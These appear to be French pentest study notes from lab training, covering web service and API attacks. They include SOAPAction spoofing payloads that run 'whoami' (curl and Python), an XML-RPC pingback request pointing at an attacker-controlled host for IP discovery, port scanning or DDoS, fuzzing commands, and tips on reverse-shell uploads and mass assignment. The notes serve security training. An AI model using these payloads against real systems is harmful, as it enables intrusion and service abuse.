
- [[#Web Services]]
- [[#API]]

---
# Web Services


- [ ] [[#Web Services Description Language WSDL]]
- [ ] [[#SOAPAction Spoofing]]
- [ ] [[#Command Injection]]
- [ ] [[#XML-RPC]]

## Web Services Description Language #WSDL

> [!Formes de fichier WSDL possibles]
> `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`

Si découverte d'un fichier wsdl vide, fuzz les paramètres:

```bash
ffuf -u 'http://10.129.72.227:3002/wsdl?FUZZ' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```


## SOAPAction Spoofing

> [!TIP]
> Si un service web ne prend en compte que l'attribut SOAPAction pour déterminer l'opération à exécuter, il peut être vulnérable à l'usurpation de SOAPAction.

Exploitation en envoyant une requête POST:

```bash
curl -X POST http://10.129.72.227:3002/wsdl -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>' -H 'SOAPAction: "ExecuteCommand"'
```

Exploitation avec un script Python

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```


---

## [[Command Injection]]


---

## XML-RPC

```BASH
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

### Pingback.ping Méthode

> [!TIP]
>  
> - Permet d'identifier l'IP publique (intéressant si derrière un cloudflare) -> doit pointer vers un VPS contrôlé par l'attaquant.
> - Cross-Site Port Attack (XSPA) -> permet d'identifier les ports ouverts sur la machine en pointant vers lui même (regarder les réponses / différence de temps eentree elles)
> - DDoS

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```


---
# API

- [ ] [[#1. Fuite d'informations]]
- [ ] [[#2. Broken Object Level Authorization (IDOR)]]
- [ ] [[#3. Broken Authentication]]
- [ ] [[#4. Broken Object Property Level Authorization]]
- [ ] [[#5. Unrestricted Resource Consumption]]
- [ ] [[#6. Broken Function Level Authorization]]
- [ ] [[#7. Unrestricted Access to Sensitive Business Flows]]
- [ ] [[#8. Server-Side Request Forgery (SSRF)]]
- [ ] [[#9. Security Misconfiguration]]
- [ ] [[#10. Improper Inventory Management]]
- [ ] [[#11. Unsafe Consumption of APIs]]
- [ ] [[#Tester XSS (Cross-Site Scripting)]]
- [ ] [[#Tester XXE Injection]]
- [ ] [[#Regular Expression Denial of Service (ReDoS)]]
- [ ] [[#Tester HTTP Verb Tempering]]


## 1. Fuite d'informations

Wordlist endpoint API:

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt

Fuzzing de paramètres:

```bash
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
```

Fuzzing d'Endpoints:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u 'http://10.129.95.243:3000/api/FUZZ'
```


## 2. Broken Object Level Authorization (IDOR)

### CWE-639: Authorization Bypass Through User-Controlled Key

[[IDOR (Insecure Direct Object References)#Insecure APIs]]



## 3. Broken Authentication

### CWE-307: Improper Restriction of Excessive Authentication Attempts

[[BROKEN AUTHENTICATION#Brute Force]]



## 4. Broken Object Property Level Authorization

### CWE-213: Excessive Data Exposure

Identifier des données personnelles telles que @mail ou num de tel dans les suppliers / customers par exemple.


### CWE-915: Mass Assignement

Tester de rajouter des paramètres existants dans requetes (création de compte en précisant un paramètre précédemment identifié "isAdmin:true" / modifier le prix d'un produit lors de son ajout au panier par exemple)

Chain avec le Verb Tempering.



## 5. Unrestricted Resource Consumption

### CWE-400: Uncontrolled Resource Consumption

> [!TIP]
> A web API is vulnerable to `Unrestricted Resource Consumption` if it fails to limit user-initiated requests that consume resources such as `network bandwidth`, `CPU`, `memory`, and `storage`
> 

1. Tenter d'upload un fichier volumineux pour voir la réponse du serveur.

Créer fichier de 30mb
```shell
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

2. Tenter d'upload un fichier qui ne correspond pas au format requis -> reverseshell en .exe par exemple -> [[FILE UPLOAD]]

3. Tenter de spam requêtes sur les endpoints pour voir la réaction du server


## 6. Broken Function Level Authorization

### CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Tester les endpoints qui necessite une autorisation pour identifier ceux qui autorisent tout de même les users qui n'en ont pas.


## 7. Unrestricted Access to Sensitive Business Flows

Suite au CWE-200: Exposure of Sensitive Information to an Unauthorized Actor -> Cela révèle-t-il des données ayant un impact significatif sur le business de l'entreprise tel que des dates de réductions sur les prix, qui couplé à CWE-400: Uncontrolled Resource Consumption pourrait mener au vidage des stocks par un acteur malveillant sur ces dates par ex ?


## 8. Server-Side Request Forgery (SSRF)

### CWE-918 : Server-Side Request Forgery (SSRF)

Identifier fichiers locaux inclus et tenter LFI par ex...

- [[SSRF (Server-Side Request Forgery)]]
- [[FILE INCLUSION]]



## 9. Security Misconfiguration

### CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Tester [[SQLi (Injections SQL)]] dans les paramètres (également dans les paramètres SOAP).

### HTTP Headers

CORS (Cross-origin resource sharing) Policy ? ([Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) ...)

Inclure Origin header et identifier le header de la réponse -> ``-H "Origin: *"``

Si [Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) = * -> Tester [[CSRF - XSRF (Cross-Site Request Forgery)]]


## 10. Improper Inventory Management

Identifier une autre version de l'API (v0 par exemple) qui ne serait plus maintenue et tester les vulnérabilités précédentes dessus

```bash
curl http://83.136.253.198:41733/swagger/v0/swagger.json | jq
```


## 11. Unsafe Consumption of APIs

Several critical vulnerabilities can arise from API-to-API communication

1. `Insecure Data Transmission`: APIs communicating over unencrypted channels expose sensitive data to interception, compromising confidentiality and integrity.
2. `Inadequate Data Validation`: Failing to properly validate and sanitize data received from external APIs before processing or forwarding it to downstream components can lead to injection attacks, data corruption, or even remote code execution.
3. `Weak Authentication`: Neglecting to implement robust authentication methods when communicating with other APIs can result in unauthorized access to sensitive data or critical functionality.
4. `Insufficient Rate-Limiting`: An API can overwhelm another API by sending a continuous surge of requests, potentially leading to denial-of-service.
5. `Inadequate Monitoring`: Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.


[CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)



## Tester [[XSS (Cross-Site Scripting)]]


## Tester [[XXE Injection]]


## Regular Expression Denial of Service (ReDoS)

https://regex101.com/
https://devina.io/redos-checker

Tester une valeur comme et voir si temps de réponse plus long

```
jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.
```

## Tester [[HTTP Verb Tempering]]





